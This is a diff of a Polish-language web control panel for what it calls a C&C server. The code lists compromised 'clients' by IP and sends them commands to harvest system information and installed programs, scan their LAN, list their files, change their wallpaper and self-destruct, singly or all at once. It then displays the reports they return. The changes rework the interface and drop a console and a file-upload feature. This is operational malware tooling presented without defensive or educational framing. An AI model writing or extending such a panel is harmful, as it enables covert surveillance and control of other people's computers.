@@ -15,6 +15,7 @@
             --red: #f44336;
             --yellow: #ffeb3b;
             --cyan: #00bcd4;
+            --magenta: #e91e63;
         }
 
         body {
@@ -46,7 +47,7 @@
             box-shadow: 0 4px 8px rgba(0, 0, 0, 0.3);
         }
 
-        .client-list, .command-panel, .console-log {
+        .client-list, .command-panel {
             display: flex;
             flex-direction: column;
             gap: 15px;
@@ -101,7 +102,7 @@
             background-color: #0088cc;
         }
 
-        .console-log {
+        .report-log {
             height: 400px;
             overflow-y: scroll;
             background-color: var(--bg-color);
@@ -121,8 +122,10 @@
         .log-yellow { color: var(--yellow); }
         .log-red { color: var(--red); }
         .log-cyan { color: var(--cyan); }
-        .log-magenta { color: #e91e63; }
+        .log-magenta { color: var(--magenta); }
+        .log-blue { color: #007bff; }
         .log-white { color: var(--text-color); }
+        .log-server { color: #8a2be2; }
 
         .form-group {
             display: flex;
@@ -153,7 +156,7 @@
     <div class="container">
         <h1>Panel Zarządzania Serwerem C&C</h1>
         
-        <div id="gui-mode" class="card">
+        <div class="card">
             <h2>Klienci</h2>
             <div id="client-list" class="client-list">
                 <p>Ładowanie klientów...</p>
@@ -177,38 +180,24 @@
                         <option value="lan-print">Skanuj sieć LAN</option>
                         <option value="list-files">Wyświetl pliki</option>
                         <option value="change-wallpaper">Zmień tapetę</option>
-                        <option value="transfer-file">Prześlij plik</option>
                         <option value="self-destruct">Auto-destrukcja</option>
                     </select>
                 </div>
                 
                 <div class="form-group" id="extra-data-group" style="display:none;">
-                    <label for="extra-data-input">Dodatkowe dane:</label>
+                    <label for="extra-data-input">Dodatkowe dane (np. ścieżka):</label>
                     <input type="text" id="extra-data-input" placeholder="Wpisz tutaj dane...">
-                </div>
-
-                <div class="form-group" id="file-transfer-group" style="display:none;">
-                    <label for="file-input">Wybierz plik do przesłania:</label>
-                    <input type="file" id="file-input">
-                    <label for="target-path-input">Ścieżka docelowa na komputerze klienta:</label>
-                    <input type="text" id="target-path-input" placeholder="np. C:\\Users\\Public" value="automatic">
                 </div>
 
                 <button id="send-command-btn">Wyślij Komendę</button>
             </div>
         </div>
         
-        <div id="console-mode" class="card" style="display:none;">
-            <h2>Konsola Serwera</h2>
-            <div class="console-log" id="console-output">
-                </div>
-            <div class="form-group row">
-                <input type="text" id="console-input" placeholder="Wpisz komendę (np. /help)">
-                <button id="console-send-btn">Wyślij</button>
+        <div class="card">
+            <h2>Dziennik Raportów</h2>
+            <div class="report-log" id="report-output">
             </div>
         </div>
-        
-        <button onclick="toggleMode()">Przełącz tryb</button>
     </div>
 
     <script>
@@ -221,23 +210,16 @@
         const extraDataGroup = document.getElementById('extra-data-group');
         const extraDataInput = document.getElementById('extra-data-input');
         
-        const fileTransferGroup = document.getElementById('file-transfer-group');
-        const fileInput = document.getElementById('file-input');
-        const targetPathInput = document.getElementById('target-path-input');
-        
-        const consoleOutput = document.getElementById('console-output');
-        const consoleInput = document.getElementById('console-input');
-        const consoleSendBtn = document.getElementById('console-send-btn');
+        const reportOutput = document.getElementById('report-output');
 
-        let isConsoleMode = false;
-        
-        function toggleMode() {
-            isConsoleMode = !isConsoleMode;
-            document.getElementById('gui-mode').style.display = isConsoleMode ? 'none' : 'block';
-            document.getElementById('console-mode').style.display = isConsoleMode ? 'block' : 'none';
+        function logMessage(message, colorClass = 'log-white') {
+            const logEntry = document.createElement('pre');
+            logEntry.className = `log-entry ${colorClass}`;
+            logEntry.textContent = `[${new Date().toLocaleTimeString()}] ${message}`;
+            reportOutput.appendChild(logEntry);
+            reportOutput.scrollTop = reportOutput.scrollHeight;
         }
 
-        // GUI Logic
         async function fetchClients() {
             try {
                 const response = await fetch(`${API_URL}/clients`);
@@ -275,60 +257,21 @@
         
         function checkExtraDataVisibility() {
             const commandType = commandTypeSelect.value;
-            extraDataGroup.style.display = 'none';
-            fileTransferGroup.style.display = 'none';
-            extraDataInput.value = '';
-
             if (['list-files', 'change-wallpaper'].includes(commandType)) {
                 extraDataGroup.style.display = 'flex';
                 extraDataInput.placeholder = 'Wpisz ścieżkę...';
             } else if (commandType === 'transfer-file') {
-                fileTransferGroup.style.display = 'flex';
-            }
-        }
-        
-        async function sendFile() {
-            const clientIP = commandClientSelect.value;
-            const file = fileInput.files[0];
-            const targetPath = targetPathInput.value;
-
-            if (!file) {
-                alert("Proszę wybrać plik do przesłania.");
-                return;
-            }
-
-            if (!clientIP || clientIP === 'all') {
-                alert("Proszę wybrać konkretnego klienta, aby wysłać plik.");
-                return;
-            }
-            
-            const formData = new FormData();
-            formData.append('file', file);
-            formData.append('client_ip', clientIP);
-            formData.append('target_path', targetPath);
-
-            try {
-                const response = await fetch(`${API_URL}/upload_file`, {
-                    method: 'POST',
-                    body: formData
-                });
-                if (!response.ok) throw new Error('Failed to upload file');
-                
-                alert('Plik wysłany pomyślnie! Komenda transferu została dodana do kolejki.');
-            } catch (error) {
-                alert(`Błąd podczas przesyłania pliku: ${error.message}`);
+                extraDataGroup.style.display = 'flex';
+                extraDataInput.placeholder = 'Wybierz plik do przesłania...';
+            } else {
+                extraDataGroup.style.display = 'none';
+                extraDataInput.value = '';
             }
         }
 
         async function sendCommand() {
-            const commandType = commandTypeSelect.value;
-            
-            if (commandType === 'transfer-file') {
-                await sendFile();
-                return;
-            }
-            
             const clientIP = commandClientSelect.value;
+            const commandType = commandTypeSelect.value;
             const extraData = extraDataInput.value;
             
             const payload = {
@@ -337,11 +280,11 @@
             };
             
             if (extraDataGroup.style.display !== 'none') {
-                if (!extraData) {
-                    alert('Proszę wprowadzić dodatkowe dane (np. ścieżkę).');
-                    return;
-                }
                 payload.data = { path: extraData };
+            }
+
+            if (commandType === 'self-destruct' && !confirm(`Jesteś pewien, że chcesz zniszczyć klienta${clientIP === 'all' ? " WSZYSTKICH klientów" : ""}?`)) {
+                return;
             }
             
             const endpoint = clientIP === 'all' ? '/send_command_to_all' : '/send_command';
@@ -352,6 +295,8 @@
                 body.client_ip = clientIP;
             }
 
+            logMessage(`[SERVER] Wysyłanie komendy '${commandType}' do ${clientIP === 'all' ? 'wszystkich klientów' : clientIP}...`, 'log-server');
+
             try {
                 const response = await fetch(`${API_URL}${endpoint}`, {
                     method: 'POST',
@@ -360,13 +305,13 @@
                 });
                 if (!response.ok) throw new Error('Failed to send command');
                 
-                alert('Komenda wysłana pomyślnie!');
+                const result = await response.json();
+                logMessage(`[SERVER] ${result.message}`, 'log-green');
             } catch (error) {
-                alert(`Błąd: ${error.message}`);
+                logMessage(`[SERVER] Błąd: Nie można wysłać polecenia. ${error.message}`, 'log-red');
             }
         }
 
-        // Console Logic
         async function fetchReports() {
             try {
                 const response = await fetch(`${API_URL}/get_reports`);
@@ -380,224 +325,69 @@
                     switch (report.status) {
                         case 'new_connection':
                             logClass = 'log-green';
-                            logMessage = `[SERVER] Klient [${report.client_ip}] połączony pomyślnie.`;
+                            logMessage = `[SERWER] Klient [${report.client_ip}] połączony pomyślnie.`;
                             break;
                         case 'lan-scan-complete':
                             logClass = 'log-cyan';
-                            logMessage = `[REPORT] [${report.client_ip}] -> Wyniki skanowania sieci LAN:\n  • ${report.info.lan_devices.join('\n  • ')}`;
+                            logMessage = `[RAPORT] [${report.client_ip}] -> Wyniki skanowania sieci LAN:\n  • ${report.info.lan_devices.join('\n  • ')}`;
                             break;
                         case 'system-info-complete':
                             logClass = 'log-magenta';
-                            logMessage = `[REPORT] [${report.client_ip}] [INFO SYSTEMOWE] Zgromadzone dane:\n  • System operacyjny: ${report.info.os}\n  • Katalog domowy: ${report.info.home_directory}\n  • Zainstalowane programy: ${report.info.installed_programs.slice(0, 5).join(', ')}...`;
+                            logMessage = `[RAPORT] [${report.client_ip}] [INFO SYSTEMOWE] Zgromadzone dane:\n  • System operacyjny: ${report.info.os}\n  • Katalog domowy: ${report.info.home_directory}\n  • Zainstalowane programy: ${report.info.installed_programs.slice(0, 5).join(', ')}...`;
                             break;
                         case 'file-list-complete':
                             logClass = 'log-blue';
-                            logMessage = `[REPORT] [${report.client_ip}] -> Lista plików dla ścieżki '${report.info.path}':\n${JSON.stringify(report.info.file_tree, null, 2)}`;
+                            logMessage = `[RAPORT] [${report.client_ip}] -> Lista plików dla ścieżki '${report.info.path}':\n${JSON.stringify(report.info.file_tree, null, 2)}`;
                             break;
                         case 'script-output':
                             logClass = 'log-yellow';
-                            logMessage = `[REPORT] [${report.client_ip}] -> Wynik wykonania skryptu:\n${report.info.output}`;
+                            logMessage = `[RAPORT] [${report.client_ip}] -> Wynik wykonania skryptu:\n${report.info.output}`;
                             break;
                         case 'file-transfer-complete':
-                            logClass = 'log-green';
-                            logMessage = `[REPORT] [${report.client_ip}] -> Przesyłanie pliku '${report.info.file_name}' zakończone pomyślnie. Zapisano w: ${report.info.path}.`;
-                            break;
                         case 'wallpaper-change-complete':
                             logClass = 'log-green';
-                            logMessage = `[REPORT] [${report.client_ip}] -> ${report.status.replace(/-/g, ' ')}`;
+                            logMessage = `[RAPORT] [${report.client_ip}] -> ${report.status.replace(/-/g, ' ')}`;
                             break;
                         case 'wallpaper-change-error':
-                        case 'file-transfer-error':
                             logClass = 'log-red';
-                            logMessage = `[REPORT] [${report.client_ip}] -> Błąd: ${report.info.error}`;
+                            logMessage = `[RAPORT] [${report.client_ip}] -> Błąd zmiany tapety: ${report.info.error}`;
                             break;
+                        case 'self-destruct':
+                            logClass = 'log-red';
+                            logMessage = `[RAPORT] [${report.client_ip}] -> Samozniszczenie rozpoczęte.`;
+                            break;
+                        default:
+                            if (report.status.includes('error')) {
+                                logClass = 'log-red';
+                            } else if (report.status.includes('complete')) {
+                                logClass = 'log-green';
+                            }
+                            logMessage = `[RAPORT] [${report.client_ip}] -> ${report.status.replace(/-/g, ' ')}`;
                     }
                     
                     const logEntry = document.createElement('pre');
                     logEntry.className = `log-entry ${logClass}`;
                     logEntry.textContent = `[${new Date(report.time * 1000).toLocaleTimeString()}] ${logMessage}`;
-                    consoleOutput.appendChild(logEntry);
-                    consoleOutput.scrollTop = consoleOutput.scrollHeight;
+                    reportOutput.appendChild(logEntry);
+                    reportOutput.scrollTop = reportOutput.scrollHeight;
                 });
 
             } catch (error) {
-                // Log errors to console but don't clutter the UI
                 console.error('Error fetching reports:', error);
             }
-        }
-
-        async function sendConsoleCommand() {
-            const command = consoleInput.value.trim();
-            if (!command) return;
-
-            // Display command in console log
-            const commandEntry = document.createElement('pre');
-            commandEntry.className = 'log-entry';
-            commandEntry.textContent = `> ${command}`;
-            consoleOutput.appendChild(commandEntry);
-            consoleOutput.scrollTop = consoleOutput.scrollHeight;
-
-            consoleInput.value = '';
-            
-            const parts = command.split(" ", 2);
-            const mainCommand = parts[0];
-            const target = parts[1] || null;
-            const extraData = command.substring(command.indexOf(target) + target.length).trim() || null;
-            
-            let payload = null;
-            let endpoint = '';
-            let body = {};
-            let isTargetAll = target && target.toLowerCase() === 'all';
-            
-            switch (mainCommand) {
-                case '/list':
-                    const clients = await fetchClients(); // Re-use the fetchClients function
-                    if (clients) {
-                        const listEntry = document.createElement('pre');
-                        listEntry.className = 'log-entry log-yellow';
-                        let clientListText = "--- Podłączone Klienty ---\n";
-                        for (const ip in clients) {
-                            const details = clients[ip];
-                            const lastSeen = new Date(details.last_seen * 1000).toLocaleString();
-                            clientListText += `• IP: ${ip} [Wersja: ${details.version}]\n`;
-                            clientListText += `  Status: ${details.status}\n`;
-                            clientListText += `  Ostatnio widziany: ${lastSeen}\n`;
-                        }
-                        clientListText += "--------------------------";
-                        listEntry.textContent = clientListText;
-                        consoleOutput.appendChild(listEntry);
-                    }
-                    return; // Don't send a command to the API
-                case '/informacje':
-                    if (target) {
-                        payload = { type: "get-info", data: {} };
-                        endpoint = "/send_command";
-                        body = { client_ip: target, command: payload };
-                    } else {
-                         logMessage('Błąd: Użycie: /informacje [IP]', 'red');
-                         return;
-                    }
-                    break;
-                case '/lan-print':
-                    if (isTargetAll) {
-                        payload = { type: "lan-print-all", data: {} };
-                        endpoint = "/send_command_to_all";
-                        body = { command: payload };
-                    } else if (target) {
-                        payload = { type: "lan-print", data: {} };
-                        endpoint = "/send_command";
-                        body = { client_ip: target, command: payload };
-                    } else {
-                        logMessage('Błąd: Użycie: /lan-print [IP/all]', 'red');
-                        return;
-                    }
-                    break;
-                case '/list-files':
-                    if (target && extraData) {
-                        payload = { type: "list-files", data: { path: extraData } };
-                        endpoint = "/send_command";
-                        body = { client_ip: target, command: payload };
-                    } else {
-                        logMessage('Błąd: Użycie: /list-files [IP] [ścieżka]', 'red');
-                        return;
-                    }
-                    break;
-                case '/zmien-tapete':
-                    if (target && extraData) {
-                        payload = { type: "change-wallpaper", data: { path: extraData } };
-                        endpoint = isTargetAll ? "/send_command_to_all" : "/send_command";
-                        body = { command: payload };
-                        if (!isTargetAll) body.client_ip = target;
-                    } else {
-                        logMessage('Błąd: Użycie: /zmien-tapete [IP/all] [ścieżka]', 'red');
-                        return;
-                    }
-                    break;
-                case '/auto-destrukcja':
-                    if (target) {
-                        if (confirm(`Jesteś pewien, że chcesz zniszczyć klienta${isTargetAll ? " WSZYSTKICH klientów" : ""}?`)) {
-                             payload = { type: "self-destruct", data: {} };
-                             endpoint = isTargetAll ? "/send_command_to_all" : "/send_command";
-                             body = { command: payload };
-                             if (!isTargetAll) body.client_ip = target;
-                        } else {
-                            return;
-                        }
-                    } else {
-                        logMessage('Błąd: Użycie: /auto-destrukcja [IP/all]', 'red');
-                        return;
-                    }
-                    break;
-                case '/help':
-                    logMessage(`
---- Lista Dostępnych Komend ---
-/help - Wyświetla listę komend.
-/list - Wyświetla listę podłączonych klientów.
-/informacje [IP] - Zgłasza informacje systemowe klienta.
-/lan-print [IP/all] - Skanuje sieć LAN klienta/wszystkich klientów.
-/list-files [IP] [ścieżka] - Zwraca drzewo plików z podanej ścieżki.
-/zmien-tapete [IP/all] [ścieżka] - Zmienia tapetę na podany obraz.
-/auto-destrukcja [IP/all] - Wysyła polecenie samozniszczenia.
-----------------------------------
-                    `, 'yellow');
-                    return;
-                case '/clear':
-                    consoleOutput.innerHTML = '';
-                    return;
-                case '/exit':
-                    logMessage("Opuszczanie konsoli serwera...", 'yellow');
-                    // In a web context, this is more of a visual message.
-                    return;
-                default:
-                    logMessage(`Nieznana komenda: ${command}. Wpisz '/help' aby uzyskać listę komend.`, 'red');
-                    return;
-            }
-
-            // Send command to API if payload was created
-            if (payload) {
-                try {
-                    const response = await fetch(`${API_URL}${endpoint}`, {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify(body)
-                    });
-                    if (!response.ok) throw new Error('Network response was not ok');
-                    const result = await response.json();
-                    logMessage(`[SERVER] ${result.message}`, 'green');
-                } catch (error) {
-                    logMessage(`Błąd: Nie można wysłać polecenia do klienta. Szczegóły: ${error.message}`, 'red');
-                }
-            }
-        }
-        
-        function logMessage(message, color) {
-            const entry = document.createElement('pre');
-            entry.className = `log-entry log-${color}`;
-            entry.textContent = message;
-            consoleOutput.appendChild(entry);
-            consoleOutput.scrollTop = consoleOutput.scrollHeight;
         }
 
         // Event Listeners
         commandTypeSelect.addEventListener('change', checkExtraDataVisibility);
         sendCommandBtn.addEventListener('click', sendCommand);
-        
-        consoleSendBtn.addEventListener('click', sendConsoleCommand);
-        consoleInput.addEventListener('keypress', (e) => {
-            if (e.key === 'Enter') {
-                e.preventDefault();
-                sendConsoleCommand();
-            }
-        });
 
         // Initial calls
         checkExtraDataVisibility();
         fetchClients();
         setInterval(fetchClients, 5000);
         setInterval(fetchReports, 1000);
-
-        logMessage("Witamy w Konsoli Serwera. Wpisz '/help' aby uzyskać listę komend.", 'green');
         
+        logMessage("Witamy w Panelu Zarządzania Serwerem C&C. Odpowiedzi od klientów pojawią się w Dzienniku Raportów.", 'log-server');
     </script>
 </body>
 </html>
